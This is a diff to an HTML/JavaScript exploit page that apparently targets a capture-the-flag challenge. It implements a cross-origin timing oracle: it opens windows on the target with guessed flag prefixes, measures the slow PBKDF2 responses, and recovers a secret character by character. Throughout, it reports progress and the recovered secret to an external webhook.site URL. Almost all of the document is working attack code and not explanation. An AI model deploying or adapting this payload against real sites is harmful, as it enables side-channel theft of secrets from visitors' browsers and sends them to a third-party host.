@@ -1,101 +1,79 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
-// v6 - full timing oracle with correct threshold (~460ms PBKDF2)
+// v7 - pure sequential, early exit, start from known prefix
 var T="https://svfgp.breakable.live";
 var W="https://webhook.site/306c9b82-bc9d-4987-bbcf-8abd283ef3eb";
-var known="CTF{";
+var known="CTF{1651084a";
 var HEX="0123456789abcdef";
-var PT=5000; // 5s timeout per probe (PBKDF2 is ~460ms)
+var THRESH=320; // match ~460ms, non-match ~150ms, threshold in between
 
 function exfil(d){
   var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
-  try{fetch(u,{mode:"no-cors",cache:"no-store"});}catch(e){}
-  try{new Image().src=u+"&x=1";}catch(e){}
+  fetch(u,{mode:"no-cors",cache:"no-store"}).catch(function(){});
 }
 
-exfil("v6_LOADED");
+exfil("v7_LOADED");
 
 function probeOne(q){
   return new Promise(function(res){
-    var sid="s"+Date.now()+"-"+Math.random().toString(36).slice(2,8);
-    var rid="r"+Math.random().toString(36).slice(2,8);
+    var sid="s"+Math.random().toString(36).slice(2,10);
+    var rid="r"+Math.random().toString(36).slice(2,10);
     var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
       "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
     var t0=performance.now();
-    var wn="p_"+Math.random().toString(36).slice(2,8);
     var w;
-    try{w=window.open(url,wn);}catch(e){res({q:q,t:0,src:"err"});return;}
-    if(!w){res({q:q,t:0,src:"null"});return;}
+    try{w=window.open(url,"probewin");}catch(e){res(0);return;}
+    if(!w){res(0);return;}
     var done=false;
-    function fin(ms,src){if(done)return;done=true;try{w.close();}catch(e){}res({q:q,t:Math.round(ms),src:src});}
+    function fin(ms){if(done)return;done=true;try{w.close();}catch(e){}res(Math.round(ms));}
     function handler(e){
       if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
         window.removeEventListener("message",handler);
-        fin(performance.now()-t0,"msg");
+        fin(performance.now()-t0);
       }
     }
     window.addEventListener("message",handler);
-    setTimeout(function(){window.removeEventListener("message",handler);fin(performance.now()-t0,"timeout");},PT);
+    setTimeout(function(){window.removeEventListener("message",handler);fin(-1);},3000);
   });
 }
 
-// Probe all 16 hex chars in parallel for a given prefix
-function probePosition(prefix){
-  var probes=HEX.split("").map(function(ch){return probeOne(prefix+ch);});
-  return Promise.all(probes);
+async function findChar(prefix,pos){
+  // Test each hex char, return as soon as one is slow (> threshold)
+  for(var i=0;i<16;i++){
+    var ch=HEX[i];
+    var t=await probeOne(prefix+ch);
+    if(t>THRESH){
+      exfil("HIT:p"+pos+"="+ch+"("+t+"ms)");
+      return ch;
+    }
+  }
+  // None exceeded threshold - pick max from a second pass
+  exfil("MISS_P"+pos+":retry");
+  var best={c:"",t:0};
+  for(var i=0;i<16;i++){
+    var ch=HEX[i];
+    var t=await probeOne(prefix+ch);
+    if(t>best.t)best={c:ch,t:t};
+  }
+  exfil("RETRY_P"+pos+":"+best.c+"="+best.t+"ms");
+  return best.c;
 }
 
 async function run(){
-  exfil("v6_START:"+known);
-  var startTime=Date.now();
+  exfil("v7_START:"+known+"(len="+known.length+")");
+  var t0=Date.now();
+  var needed=4+64-known.length; // how many more chars needed
 
-  for(var pos=0;pos<64;pos++){
-    if(Date.now()-startTime > 52000){
-      exfil("TIME_UP:"+known);
-      break;
-    }
-
-    var results=await probePosition(known);
-    // Sort by time descending
-    results.sort(function(a,b){return b.t-a.t;});
-
-    var top=results[0];
-    var second=results[1];
-    var median=results[8];
-    var gap=top.t-second.t;
-    var topChar=top.q.slice(-1);
-
-    // Log top 3 for this position
-    var info=results.slice(0,3).map(function(r){return r.q.slice(-1)+"="+r.t;}).join(",");
-    exfil("P"+pos+":"+info+"|g="+gap+"|m="+median.t);
-
-    // The matching char should be significantly slower (PBKDF2 ~400-500ms)
-    // Accept if gap > 150ms between top and second
-    if(gap > 150 && top.src==="msg"){
-      known+=topChar;
-      exfil("F:"+known);
-    } else if(top.t - median.t > 200){
-      // Fallback: compare top vs median
-      known+=topChar;
-      exfil("F:"+known+" (median_gap="+(top.t-median.t)+")");
-    } else {
-      // Very noisy - try the position again with sequential probes
-      exfil("NOISY_P"+pos+":retrying_seq");
-      var best={c:"",t:0};
-      for(var i=0;i<HEX.length;i++){
-        var r=await probeOne(known+HEX[i]);
-        if(r.t>best.t){best={c:HEX[i],t:r.t};}
-      }
-      known+=best.c;
-      exfil("F:"+known+" (seq)");
-    }
+  for(var p=0;p<needed;p++){
+    if(Date.now()-t0>52000){exfil("TIME:"+known);break;}
+    var pos=known.length-4;
+    var ch=await findChar(known,pos);
+    known+=ch;
+    exfil("F:"+known);
   }
 
-  // Check if we got all 64 hex chars
-  if(known.length===4+64){
-    known+="}";
-  }
+  if(known.length===4+64)known+="}";
   exfil("DONE:"+known);
 }
 
-setTimeout(run,300);
+setTimeout(run,200);
 </script></body></html>
